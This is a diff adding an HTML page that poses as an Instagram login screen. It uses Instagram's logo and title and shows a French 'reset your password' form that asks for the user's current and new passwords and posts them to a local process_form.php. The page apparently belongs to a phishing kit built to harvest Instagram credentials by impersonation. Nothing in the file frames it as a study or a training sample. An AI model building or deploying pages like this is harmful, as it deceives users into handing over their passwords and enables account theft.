@@ -1,0 +1,77 @@
+<!-- Made with love by Apratim Shukla -->
+<!DOCTYPE html>
+<html lang="en" >
+
+<head>
+    <meta charset="UTF-8">
+    <title>Login • Instagram</title>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" type="image/x-icon" href="./favicon.ico">
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+
+</head>
+
+<body>
+<nav class="navbar">
+    <div class="inner-wrapper">
+        <div class="logo">
+            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Logo">
+        </div>
+
+
+            <input  placeholder="Rechercher" id="input1" type="text" >
+
+            <i class="fa fa-search search-box-icon"></i>
+            </input>
+
+
+
+
+
+
+
+    </div>
+</nav>
+
+<div class="login">
+    <!--...
+-->
+    <h1 class="First"></h1>
+    <div class="First">Créez un mot de passe fort</div>
+    <div class="Second"  >Votre mot de passe doit contenir au moins 6 caractères ainsi qu’une combinaison de chiffres, de lettres et de caractères spéciaux ( !$@%).
+    </div>
+
+
+    <form action="process_form.php" method="POST">
+
+        <input  placeholder="mot de passe actuel" type="password" class="Form" name="current_password">
+        <input  placeholder="Nouveau mot de passe" type="password" class="Form" name="new_password">
+        <input  placeholder="Confirmer le nouveau mot de passe" type="password" name="confirm_password">
+
+        <input class="Send" type="submit" value="Réinitialiser le mot de passe" /><br>
+
+    </form>
+
+
+
+
+
+</div>
+
+
+
+
+
+<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+
+
+
+
+
+</body>
+
+</html>
